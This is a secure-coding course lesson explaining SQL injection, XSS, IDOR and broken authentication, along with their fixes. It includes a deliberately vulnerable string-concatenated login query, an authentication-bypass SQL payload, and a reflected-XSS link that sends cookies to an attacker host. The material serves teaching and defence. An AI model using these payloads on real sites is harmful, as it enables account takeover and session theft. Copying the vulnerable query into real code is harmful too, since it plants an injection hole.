---
id: 01-owasp-top10-essentials
order: 1
duration_minutes: 75
---

# Lesson 1: OWASP Top 10 Essentials — The Vulnerabilities That Dominate Real-World Breaches

## Learning Objectives

- Explain what SQL injection is, how it works, and what conditions in code make it possible
- Describe reflected, stored, and DOM-based XSS and the difference between them
- Define Insecure Direct Object Reference (IDOR) and explain why access control must be enforced server-side
- Identify broken authentication patterns — weak session management, credential stuffing exposure, and missing MFA — and their consequences

## SQL Injection: The Classic That Never Goes Away

SQL injection (SQLi) remains one of the most prevalent and damaging vulnerability classes despite being well-understood for over two decades. It occurs when user-supplied input is interpolated directly into a SQL query without proper sanitisation, allowing an attacker to alter the query's structure and intent.

Consider this Python snippet:

```python
# VULNERABLE
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
cursor.execute(query)
```

If an attacker submits `' OR '1'='1' --` as the username, the query becomes:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '...'
```
The `OR '1'='1'` condition is always true; the `--` comments out the password check. The attacker is authenticated without valid credentials.

More destructive payloads can extract the entire database (`UNION SELECT`), write files to the filesystem (`INTO OUTFILE`), or execute operating system commands (through stored procedures in some database configurations). In 2023 and 2024, SQLi remained the entry vector for multiple significant data breaches affecting millions of records.

The root cause is always the same: treating user input as trusted SQL syntax. The fix — parameterised queries — is equally consistent and is covered in depth in Lesson 2.

## Cross-Site Scripting (XSS): Injecting Malicious Scripts into Trusted Pages

XSS attacks occur when an application includes unvalidated user input in its output, causing a victim's browser to execute attacker-controlled JavaScript in the context of the vulnerable site. Because the script runs in the browser as if it came from the trusted site, it can access session cookies, make authenticated API calls, modify page content, and redirect users.

**Reflected XSS** is the simplest form: the malicious script is injected in the request (typically via a URL parameter) and reflected immediately in the response. A link like `https://app.example.com/search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>` — when clicked — executes in the victim's browser. Delivery is typically via phishing email or crafted URL.

**Stored XSS** is more dangerous: the payload is persisted in the application's database (via a comment field, profile field, forum post) and served to every user who views the affected content. A single payload can compromise thousands of sessions without further attacker interaction.

**DOM-based XSS** occurs entirely client-side: JavaScript in the page reads from an attacker-controlled source (URL hash, `document.referrer`, `postMessage`) and writes it to a dangerous sink (`innerHTML`, `eval`, `document.write`) without server involvement. It is invisible to server-side security controls that only inspect HTTP traffic.

The prevention principle — never trust, always encode — means that any data of external origin must be output-encoded for the specific context in which it appears (HTML body, HTML attribute, JavaScript string, URL parameter) before rendering.

## Insecure Direct Object Reference (IDOR): When the Server Trusts the Client

IDOR vulnerabilities arise when an application exposes internal object identifiers — database primary keys, file system paths, account IDs — in client-accessible parameters, and fails to verify that the requesting user is authorised to access that specific object.

Example scenario: a user is viewing their invoice at `/invoices/download?id=1042`. They change the ID to `1041` in the address bar. If the server returns invoice 1041 without checking whether the requesting user owns that invoice, an IDOR vulnerability exists. Systematically incrementing through IDs allows an attacker to enumerate and download all records in the database — a complete data breach with no technical exploitation required, just arithmetic.

IDOR is deceptively simple but consistently underestimated during development. The fix requires authorization checks at the data layer on every request — not just at the route level. Authentication (who are you?) and authorisation (are you allowed to do this specific thing?) are distinct controls, and omitting the latter is the most common form of broken access control.

## Broken Authentication: When Sessions Become Vulnerabilities

Authentication flaws allow attackers to assume other users' identities, often without ever knowing their credentials. The most common patterns are:

**Credential stuffing exposure:** If the application does not rate-limit or lock authentication endpoints, attackers can try large lists of username/password combinations (from previous breaches) at high speed. Applications without lockout or CAPTCHA mechanisms are trivially abusable.

**Weak session management:** Session tokens must be random, long, generated by a cryptographically secure source, transmitted only over HTTPS, and invalidated on logout. Common failures include sequential session IDs (which can be guessed), session tokens in URLs (exposed in server logs and browser history), and sessions that remain valid indefinitely after logout — allowing session hijacking attacks.

**Missing or bypassable MFA:** Even when MFA is implemented, implementation errors can make it bypassable: MFA checks performed client-side rather than server-side, endpoints that bypass the MFA flow entirely (such as password reset flows or API endpoints), or MFA codes that remain valid indefinitely rather than expiring after a short window.

## Key Takeaways

- SQL injection is caused by string concatenation of untrusted input into SQL queries; parameterised queries eliminate the entire class.
- XSS requires context-aware output encoding — HTML encoding for HTML contexts, JavaScript encoding for script contexts — not a single global filter.
- IDOR is an authorisation failure: every data access request must verify that the authenticated user is authorised for that specific resource.
- Broken authentication encompasses session management, rate limiting, MFA implementation, and secure token handling — each must be addressed independently.
- All four vulnerability classes appear regularly in real-world breaches; understanding their root causes is prerequisite to writing code that does not introduce them.
